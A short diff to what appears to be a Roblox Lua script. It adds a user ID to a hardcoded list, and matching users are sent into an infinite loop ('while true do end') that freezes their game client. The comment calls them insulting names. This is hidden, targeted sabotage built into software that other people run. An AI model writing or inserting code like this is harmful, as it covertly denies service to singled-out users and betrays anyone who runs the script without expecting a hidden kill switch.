@@ -2183,7 +2183,7 @@ if FileDir and isFolder and makeFolder then
 	end
 end 
 
-if LP.UserId == 251848039 or LP.UserId == 57890959 then 
+if LP.UserId == 251848039 or LP.UserId == 57890959 or LP.UserId == 339273796 then 
 	while true do end -- crash that dumb ass skid! 
 end 
 
